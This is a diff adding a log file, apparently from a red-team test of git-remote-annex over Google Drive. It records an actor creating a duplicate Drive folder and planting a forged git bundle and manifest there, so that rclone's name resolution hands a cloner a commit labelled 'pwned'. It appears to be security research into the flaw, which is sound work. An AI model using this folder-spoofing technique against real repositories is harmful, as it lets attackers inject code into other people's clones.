@@ -1,0 +1,50 @@
+=== 摘要 ===
+repo=/work/attack2
+prefix=agora-attack2/
+url_file=/work/attack2.url
+### find agora-attack2 folder id
+op=find-name
+target=1Obn3Rj1Quyg1l_2YW0GhXE39FpETeyLj
+http=200
+count=1
+file={"id": "1TiT2Y09Ao9w_9mClg5AfM6hm6-qxRjyd", "mimeType": "application/vnd.google-apps.folder", "name": "agora-attack2"}
+### C creates duplicate agora-attack2 folder at SPIKE root
+op=create-folder
+name=agora-attack2
+parent=1Obn3Rj1Quyg1l_2YW0GhXE39FpETeyLj
+http=200
+file_id=19pKJXiujmoizO2SjQFaX0YhWc-bcFH2z
+### rclone name resolution: which agora-attack2 does lsf see?
+=== rclone lsf gdrive:agora-attack2/ ===
+2026/09/26 08:38:46 ERROR : Failed to save config after 10 tries: failed to create temp file for new config: open /secrets/rclone-committer.conf1269062592: permission denied
+rc=0
+=== clone via URL ===
+=== fresh clone with C duplicate agora-attack2 folder present ===
+2026/09/26 08:38:57 ERROR : Failed to save config after 10 tries: failed to create temp file for new config: open /secrets/rclone-committer.conf1115709546: permission denied
+git-remote-annex: No git repository found in this remote.
+
+clone_rc=128
+### C puts forged bundle in the DUPLICATE parent-layer folder (19pKJ)
+op=create-file
+name=GITBUNDLE-s320--8346069c-d473-41db-9c6c-b28ba2e55dc3-1b7d21acf44f6701f84883317317e11614c45d8dc0387c694864b3ecef43e7f2
+parent=19pKJXiujmoizO2SjQFaX0YhWc-bcFH2z
+http=200
+file_id=1T6k5wI777lTY_oUtok5V20_E5Nu-kXro
+md5=1d233ac496305fe5d2d6e2e64aa7f8ca
+### C puts forged manifest in the DUPLICATE folder
+op=create-file
+name=GITMANIFEST--8346069c-d473-41db-9c6c-b28ba2e55dc3
+parent=19pKJXiujmoizO2SjQFaX0YhWc-bcFH2z
+http=200
+file_id=1MddPIoGR2ExHHRmd2oFPFJSXvXvEysac
+md5=934d1949e56c75b9d62b2737243bb2fd
+### what does rclone name resolution pick now?
+=== rclone cat gdrive:agora-attack2/GITMANIFEST--8346069c... ===
+2026/09/26 08:39:42 ERROR : Failed to save config after 10 tries: failed to create temp file for new config: open /secrets/rclone-committer.conf2188923285: permission denied
+GITBUNDLE-s320--8346069c-d473-41db-9c6c-b28ba2e55dc3-1b7d21acf44f6701f84883317317e11614c45d8dc0387c694864b3ecef43e7f2
+=== clone with forged pair in duplicate parent-layer folder ===
+Cloning into '/work/attack2-clone-forged'...
+2026/09/26 08:39:57 ERROR : Failed to save config after 10 tries: failed to create temp file for new config: open /secrets/rclone-committer.conf1947746100: permission denied
+clone_rc=0
+f149197 pwned
+PWNED.txt
